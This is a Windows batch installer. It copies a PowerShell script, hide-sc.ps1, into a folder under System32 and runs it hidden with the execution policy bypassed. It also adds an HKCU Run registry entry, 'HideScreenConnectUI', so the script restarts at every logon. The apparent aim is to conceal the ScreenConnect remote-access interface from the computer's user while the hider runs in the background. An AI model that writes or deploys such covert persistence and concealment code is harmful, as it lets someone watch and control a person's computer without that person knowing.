@echo off
setlocal EnableExtensions
cd /d "%~dp0"

set "INSTALL_DIR=%SystemRoot%\System32\hide"
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
set "SCRIPT=%INSTALL_DIR%\hide-sc.ps1"
set "REGKEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "VAL=HideScreenConnectUI"

if not exist "%~dp0hide-sc.ps1" (
    echo hide-sc.ps1 not found in %~dp0
    exit /b 1
)

echo Copying files to %INSTALL_DIR% ...
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
xcopy /Y /Q "%~dp0*" "%INSTALL_DIR%\" >nul

if not exist "%SCRIPT%" (
    echo Failed to copy to %INSTALL_DIR%
    exit /b 1
)

start "" "%PS%" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%SCRIPT%"
reg add "%REGKEY%" /v "%VAL%" /t REG_SZ /d "\"%PS%\" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%SCRIPT%\"" /f

echo.
echo Done. Files saved to %INSTALL_DIR%
echo You can close this window - hider keeps running in background.
exit /b 0
